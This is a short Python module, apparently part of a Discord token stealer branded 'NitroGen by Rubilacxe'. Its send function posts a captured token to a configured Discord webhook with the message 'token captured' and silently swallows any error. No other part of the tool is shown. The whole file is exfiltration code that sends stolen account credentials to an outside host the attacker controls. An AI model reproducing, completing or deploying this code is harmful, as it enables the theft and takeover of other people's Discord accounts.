import requests

# ==== CONFIG ====
WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXX/YYYYYYYY"
# ================

def send(token: str):
    if not token:
        return
    payload = {
        "content": f"**NitroGen by Rubilacxe - token captured**\n```\n{token}\n```"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception:
        pass
